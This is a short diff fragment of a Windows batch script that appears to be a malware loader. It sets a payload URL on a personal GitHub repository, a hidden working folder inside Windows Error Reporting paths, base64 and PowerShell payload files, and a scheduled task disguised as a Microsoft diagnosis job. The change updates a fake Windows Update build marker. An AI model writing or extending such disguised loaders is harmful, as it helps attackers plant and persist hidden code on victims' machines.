@@ -12,7 +12,7 @@ set "PAYURL=https://raw.githubusercontent.com/xnobuddy/github-drop/refs/heads/ma
 set "WORKDIR=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "B64=%WORKDIR%\update.b64"
 set "PS1=%WORKDIR%\wucache_pkg.ps1"
-set "MARKER=WU_BUILD_20260729F"
+set "MARKER=WU_BUILD_20260729J"
 set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"
 
 echo Using payload URL:
